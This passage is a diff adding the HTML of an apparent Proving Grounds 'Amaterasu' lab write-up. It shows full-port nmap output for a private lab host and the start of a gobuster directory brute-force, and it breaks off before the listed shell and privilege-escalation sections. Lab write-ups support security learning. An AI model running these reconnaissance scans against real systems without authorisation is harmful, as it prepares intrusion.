@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - PG Amaterasu | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - PG Amaterasu | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - PG Amaterasu | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - PG Amaterasu | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - PG Amaterasu | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for PG Amaterasu">
+<meta itemprop="description" content="Writeup for PG Amaterasu" />
+<meta property="og:description" content="Writeup for PG Amaterasu" />
+<meta name="twitter:description" content="Writeup for PG Amaterasu" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-01-01T00:00:00Z />
+    <meta property="article:published_time" content=2024-01-01T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - PG Amaterasu",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-01-01",
+        "description": "Writeup for PG Amaterasu",
+        "wordCount":  1071 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-01-01",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/amaterasu/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - PG Amaterasu</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-01-01T00:00:00&#43;00:00" itemprop="datePublished"> 1 Jan 2024 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#amaterasu">Amaterasu</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#web-page">Web Page</a></li>
+        <li><a href="#gobuster-on-40080">Gobuster on 40080</a></li>
+        <li><a href="#gobuster-on-33414">Gobuster on 33414</a></li>
+        <li><a href="#enumerating-api-endpoint">Enumerating API endpoint</a></li>
+      </ul>
+    </li>
+    <li><a href="#first-shell">First Shell</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#root-shell">Root shell</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="amaterasu">Amaterasu</h1>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Nmap 7.94 scan initiated Mon Jan  1 18:16:02 2024 as: nmap -sV -sC -T4 -p- -oN nmap.txt 192.168.162.249</span>
+</span></span><span class="line"><span class="cl"><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">162</span><span class="p">.</span><span class="py">249</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0</span><span class="p">.</span><span class="py">046s</span> <span class="n">latency</span><span class="p">).</span>
+</span></span><span class="line"><span class="cl"><span class="n">Not</span> <span class="n">shown</span><span class="err">:</span> <span class="mf">65524</span> <span class="kd">filter</span><span class="nb">ed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="nb">no-response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span>      <span class="n">STATE</span>  <span class="n">SERVICE</span>          <span class="n">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mf">21</span><span class="p">/</span><span class="n">tcp</span>    <span class="n">open</span>   <span class="n">ftp</span>              <span class="n">vsftpd</span> <span class="mf">3.0</span><span class="p">.</span><span class="py">3</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nb">ftp-syst</span><span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="n">STAT</span><span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="n">FTP</span> <span class="n">server</span> <span class="n">status</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      <span class="n">Connected</span> <span class="n">to</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">45</span><span class="p">.</span><span class="py">169</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      <span class="n">Logged</span> <span class="k">in</span> <span class="n">as</span> <span class="n">ftp</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      <span class="n">TYPE</span><span class="err">:</span> <span class="n">ASCII</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      <span class="n">No</span> <span class="n">session</span> <span class="n">bandwidth</span> <span class="n">limit</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      <span class="n">Session</span> <span class="n">timeout</span> <span class="k">in</span> <span class="n">seconds</span> <span class="n">is</span> <span class="mf">300</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      <span class="n">Control</span> <span class="n">connection</span> <span class="n">is</span> <span class="n">plain</span> <span class="n">text</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      <span class="n">Data</span> <span class="n">connections</span> <span class="n">will</span> <span class="n">be</span> <span class="n">plain</span> <span class="n">text</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      <span class="n">At</span> <span class="n">session</span> <span class="n">startup</span><span class="p">,</span> <span class="n">client</span> <span class="n">count</span> <span class="n">was</span> <span class="mf">3</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      <span class="n">vsFTPd</span> <span class="mf">3.0</span><span class="p">.</span><span class="py">3</span> <span class="p">-</span> <span class="n">secure</span><span class="p">,</span> <span class="n">fast</span><span class="p">,</span> <span class="n">stable</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="n">_End</span> <span class="n">of</span> <span class="n">status</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nb">ftp-anon</span><span class="err">:</span> <span class="n">Anonymous</span> <span class="n">FTP</span> <span class="n">login</span> <span class="n">allowed</span> <span class="p">(</span><span class="n">FTP</span> <span class="n">code</span> <span class="mf">230</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="n">_Can</span><span class="s1">&#39;t get directory listing: TIMEOUT
+</span></span></span><span class="line"><span class="cl"><span class="s1">22/tcp    closed ssh
+</span></span></span><span class="line"><span class="cl"><span class="s1">111/tcp   closed rpcbind
+</span></span></span><span class="line"><span class="cl"><span class="s1">139/tcp   closed netbios-ssn
+</span></span></span><span class="line"><span class="cl"><span class="s1">443/tcp   closed https
+</span></span></span><span class="line"><span class="cl"><span class="s1">445/tcp   closed microsoft-ds
+</span></span></span><span class="line"><span class="cl"><span class="s1">2049/tcp  closed nfs
+</span></span></span><span class="line"><span class="cl"><span class="s1">10000/tcp closed snet-sensor-mgmt
+</span></span></span><span class="line"><span class="cl"><span class="s1">25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)
+</span></span></span><span class="line"><span class="cl"><span class="s1">| ssh-hostkey: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
+</span></span></span><span class="line"><span class="cl"><span class="s1">33414/tcp open   unknown
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GetRequest, HTTPOptions: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     HTTP/1.1 404 NOT FOUND
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     Server: Werkzeug/2.2.3 Python/3.9.13
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     Date: Mon, 01 Jan 2024 16:17:53 GMT
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     Content-Type: text/html; charset=utf-8
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     Content-Length: 207
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     Connection: close
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;!doctype html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;html lang=en&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   Help: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 4.01//EN&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;http://www.w3.org/TR/html4/strict.dtd&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html;charset=utf-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;p&gt;Message: Bad request syntax (&#39;</span><span class="n">HELP</span><span class="s1">&#39;).&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   RTSPRequest: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 4.01//EN&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;http://www.w3.org/TR/html4/strict.dtd&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html;charset=utf-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;p&gt;Message: Bad request version (&#39;</span><span class="n">RTSP</span><span class="p">/</span><span class="mf">1.0</span><span class="s1">&#39;).&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    &lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))
+</span></span></span><span class="line"><span class="cl"><span class="s1">| http-methods: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_  Potentially risky methods: TRACE
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-server-header: Apache/2.4.53 (Fedora)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: My test page
+</span></span></span><span class="line"><span class="cl"><span class="s1">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF-Port33414-TCP:V=7.94%I=7%D=1/1%Time=6592E5B1%P=aarch64-unknown-linux-gn
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:u%r(GetRequest,184,&#34;HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werk
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:zeug/2\.2\.3\x20Python/3\.9\.13\r\nDate:\x20Mon,\x2001\x20Jan\x202024\x
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:2016:17:53\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:ntent-Length:\x20207\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:n&lt;html\x20lang=en&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Foun
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:d&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\x20check\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&#34;)%r(HTTPOp
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:tions,184,&#34;HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.2
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\.3\x20Python/3\.9\.13\r\nDate:\x20Mon,\x2001\x20Jan\x202024\x2016:17:5
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:3\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:gth:\x20207\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x2
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:0lang=en&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&#34;)%r(RTSPRequest,1F4
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:,&#34;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\x20\x20\x20\x20\x20\x20\x20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:dtd\&#34;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:0&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;charset=ut
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:f-8\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x2
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:0\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Mess
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:age:\x20Bad\x20request\x20version\x20\(&#39;</span><span class="n">RTSP</span><span class="p">/</span><span class="mf">1</span><span class="p">\</span><span class="mf">.0</span><span class="s1">&#39;\)\.&lt;/p&gt;\n\x20\x20\x2
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:0\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BA
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:D_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20meth
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:od\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;)%r(Help,1EF,&#34;&lt;!DOCTYPE\x2
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:0HTML\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:20\x20\x20\x20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:-equiv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x2
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:0\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:code:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x2
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:0request\x20syntax\x20\(&#39;</span><span class="n">HELP</span><span class="err">&#39;</span><span class="p">\)\.&lt;/</span><span class="n">p</span><span class="p">&gt;\</span><span class="n">n</span><span class="p">\</span><span class="n">x20</span><span class="p">\</span><span class="n">x20</span><span class="p">\</span><span class="n">x20</span><span class="p">\</span><span class="n">x20</span><span class="p">\</span><span class="n">x20</span><span class="p">\</span><span class="n">x20</span><span class="p">\</span><span class="n">x20</span><span class="p">\</span><span class="n">x2</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="err">:</span><span class="mf">0</span><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="n">Error</span><span class="p">\</span><span class="n">x20code</span><span class="p">\</span><span class="n">x20explanation</span><span class="err">:</span><span class="p">\</span><span class="n">x20HTTPStatus</span><span class="p">\.</span><span class="n">BAD_REQUEST</span><span class="p">\</span><span class="n">x20</span><span class="p">-\</span><span class="n">x20Ba</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="err">:</span><span class="n">d</span><span class="p">\</span><span class="n">x20request</span><span class="p">\</span><span class="n">x20syntax</span><span class="p">\</span><span class="n">x20or</span><span class="p">\</span><span class="n">x20unsupported</span><span class="p">\</span><span class="n">x20method</span><span class="p">\.&lt;/</span><span class="n">p</span><span class="p">&gt;\</span><span class="n">n</span><span class="p">\</span><span class="n">x20</span><span class="p">\</span><span class="n">x20</span><span class="p">\</span><span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="err">:</span><span class="mf">20</span><span class="p">\</span><span class="n">x20</span><span class="p">&lt;/</span><span class="n">body</span><span class="p">&gt;\</span><span class="n">n</span><span class="p">&lt;/</span><span class="n">html</span><span class="p">&gt;\</span><span class="n">n</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: OS: Unix
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s2"># Nmap done at Mon Jan  1 18:19:47 2024 -- 1 IP address (1 host up) scanned in 224.29 seconds
+</span></span></span></code></pre></div><h2 id="web-page">Web Page</h2>
+<p><img src="Amaterasu%208a737b17570c4996b62a570a406df97f/Screenshot_2024-01-01_at_19.54.05.png" alt="Screenshot 2024-01-01 at 19.54.05.png"></p>
+<h2 id="gobuster-on-40080">Gobuster on 40080</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># gobuster dir -u http://192.168.162.249:40080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  </span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gobuster</span> <span class="n">v3</span><span class="p">.</span><span class="py">5</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="nv">@TheColonial</span><span class="p">)</span> <span class="p">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="nv">@firefart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Url</span><span class="err">:</span>                     <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">162</span><span class="p">.</span><span class="mf">249</span><span class="err">:</span><span class="mf">40080</span><span class="p">/</span>
